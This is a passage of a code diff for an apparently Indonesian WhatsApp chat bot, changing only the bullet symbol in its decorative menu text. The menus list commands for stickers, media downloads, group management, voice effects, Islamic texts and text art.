+│➣ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
+│➣ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
+│➣ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
+│➣ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
+│➣ ${prefix}𝚝𝚘𝚐𝚒𝚏
+│➣ ${prefix}𝚝𝚘𝚞𝚛𝚕
+│➣ ${prefix}𝚝𝚘𝚟𝚗
+│➣ ${prefix}𝚝𝚘𝚖𝚙3
+│➣ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
+│➣ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
+│➣ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
+│➣ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
+│➣ ${prefix}𝚜𝚖𝚎𝚖𝚎
 ╰─────────────────╮
 ╭─────────────────╯
 │   〘 MAIN MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚙𝚒𝚗𝚐
-│➳ ${prefix}𝚘𝚠𝚗𝚎𝚛
-│➳ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
-│➳ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
-│➳ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
-│➳ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
-│➳ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
-│➳ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
-│➳ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
-│➳ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
+│➣ ${prefix}𝚙𝚒𝚗𝚐
+│➣ ${prefix}𝚘𝚠𝚗𝚎𝚛
+│➣ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
+│➣ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
+│➣ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
+│➣ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
+│➣ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
+│➣ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
+│➣ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
+│➣ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
 ╰─────────────────╮
 ╭─────────────────╯
 │〘 DATABASE MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
-│➳ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
-│➳ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
-│➳ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
-│➳ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
-│➳ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
-│➳ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
-│➳ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
+│➣ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
+│➣ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
+│➣ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
+│➣ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
+│➣ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
+│➣ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
+│➣ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
+│➣ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
 ╰─────────────────╮
 ╭─────────────────╯
 │〘ANONYMOUS MENU〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
-│➳ ${prefix}𝚜𝚝𝚊𝚛𝚝
-│➳ ${prefix}𝚗𝚎𝚡𝚝
-│➳ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
+│➣ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
+│➣ ${prefix}𝚜𝚝𝚊𝚛𝚝
+│➣ ${prefix}𝚗𝚎𝚡𝚝
+│➣ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
 ╰─────────────────╮
 ╭─────────────────╯
 │  〘 ISLAMIC MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚒𝚚𝚛𝚊
-│➳ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
-│➳ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
-│➳ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
-│➳ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
+│➣ ${prefix}𝚒𝚚𝚛𝚊
+│➣ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
+│➣ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
+│➣ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
+│➣ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
 ╰─────────────────╮
 ╭─────────────────╯
 │  〘 VOICE MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚋𝚊𝚜𝚜
-│➳ ${prefix}𝚋𝚕𝚘𝚠𝚗
-│➳ ${prefix}𝚍𝚎𝚎𝚙
-│➳ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
-│➳ ${prefix}𝚏𝚊𝚜𝚝
-│➳ ${prefix}𝚏𝚊𝚝
-│➳ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
-│➳ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
-│➳ ${prefix}𝚛𝚘𝚋𝚘𝚝
-│➳ ${prefix}𝚜𝚕𝚘𝚠
-│➳ ${prefix}𝚝𝚞𝚙𝚊𝚒
-│➳ ${prefix}𝚕𝚞𝚜𝚒𝚊𝚙𝚊
+│➣ ${prefix}𝚋𝚊𝚜𝚜
+│➣ ${prefix}𝚋𝚕𝚘𝚠𝚗
+│➣ ${prefix}𝚍𝚎𝚎𝚙
+│➣ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
+│➣ ${prefix}𝚏𝚊𝚜𝚝
+│➣ ${prefix}𝚏𝚊𝚝
+│➣ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
+│➣ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
+│➣ ${prefix}𝚛𝚘𝚋𝚘𝚝
+│➣ ${prefix}𝚜𝚕𝚘𝚠
+│➣ ${prefix}𝚝𝚞𝚙𝚊𝚒
+│➣ ${prefix}𝚕𝚞𝚜𝚒𝚊𝚙𝚊
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 OWNER MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
-│➳ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➳ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
-│➳ ${prefix}𝚕𝚎𝚊𝚟𝚎
-│➳ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
-│➳ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
-│➳ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
-│➳ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
-│➳ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
+│➣ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
+│➣ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
+│➣ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
+│➣ ${prefix}𝚕𝚎𝚊𝚟𝚎
+│➣ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
+│➣ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
+│➣ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
+│➣ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
+│➣ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
 ╰─────────────────╮
 ╭─────────────────╯
 │    〘 THANKS TO 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ akatsuki for unity
-│➳ zZz - x - team
-│➳ and my friends❤ 
+│➣ akatsuki for unity
+│➣ zZz - x - team
+│➣ and my friends❤ 
 ╰─────────────────╯
 
 © ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
@@ -3711,26 +3701,26 @@ break
 │    ◪〘 GRUP MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
-│➳ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➳ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
-│➳ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➳ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➳ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
-│➳ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
-│➳ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
-│➳ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
-│➳ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
-│➳ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
-│➳ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
-│➳ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
-│➳ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
-│➳ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
-│➳ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
+│➣ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
+│➣ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
+│➣ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
+│➣ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
+│➣ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
+│➣ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
+│➣ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
+│➣ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
+│➣ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
+│➣ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
+│➣ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
+│➣ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
+│➣ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
+│➣ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
+│➣ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
+│➣ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3747,14 +3737,14 @@ break
 │◪〘 WEBZONE MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
-│➳ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
-│➳ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
-│➳ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
-│➳ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
-│➳ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
-│➳ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
-│➳ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
+│➣ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
+│➣ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
+│➣ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
+│➣ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
+│➣ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
+│➣ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
+│➣ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
+│➣ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3771,21 +3761,21 @@ break
 │◪〘DOWNLOAD MENU〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
-│➳ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
+│➣ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3802,16 +3792,16 @@ break
 │ ◪〘 SEARCH MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
-│➳ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
+│➣ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3828,23 +3818,23 @@ break
 │ ◪〘 RANDOM MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}𝚌𝚘𝚏𝚏𝚎
-│➳ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
-│➳ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
-│➳ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
-│➳ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
-│➳ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
-│➳ ${prefix}𝚙𝚞𝚒𝚜𝚒
-│➳ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
-│➳ ${prefix}𝚊𝚗𝚒𝚖𝚎
-│➳ ${prefix}𝚠𝚊𝚒𝚏𝚞
-│➳ ${prefix}𝚑𝚞𝚜𝚋𝚞
-│➳ ${prefix}𝚗𝚎𝚔𝚘
-│➳ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
-│➳ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
-│➳ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
-│➳ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
-│➳ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
+│➣ ${prefix}𝚌𝚘𝚏𝚏𝚎
+│➣ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
+│➣ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
+│➣ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
+│➣ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
+│➣ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
+│➣ ${prefix}𝚙𝚞𝚒𝚜𝚒
+│➣ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
+│➣ ${prefix}𝚊𝚗𝚒𝚖𝚎
+│➣ ${prefix}𝚠𝚊𝚒𝚏𝚞
+│➣ ${prefix}𝚑𝚞𝚜𝚋𝚞
+│➣ ${prefix}𝚗𝚎𝚔𝚘
+│➣ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
+│➣ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
+│➣ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
+│➣ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
+│➣ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3861,37 +3851,37 @@ break
 │◪〘 TEKSPRO MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➳ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
-│➳ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
-│➳ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
-│➳ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
-│➳ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
-│➳ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
-│➳ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
-│➳ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
-│➳ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
-│➳ ${prefix}𝚜𝚙𝚊𝚌𝚎
-│➳ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
-│➳ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
-│➳ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
-│➳ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
-│➳ ${prefix}𝚋𝚎𝚛𝚛𝚢
-│➳ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
-│➳ ${prefix}𝚖𝚊𝚐𝚖𝚊
-│➳ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
-│➳ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
-│➳ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
-│➳ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
-│➳ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
-│➳ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
-│➳ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
-│➳ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
-│➳ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
-│➳ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
-│➳ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
-│➳ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
-│➳ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
-│➳ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
+│➣ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
+│➣ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
+│➣ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
+│➣ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
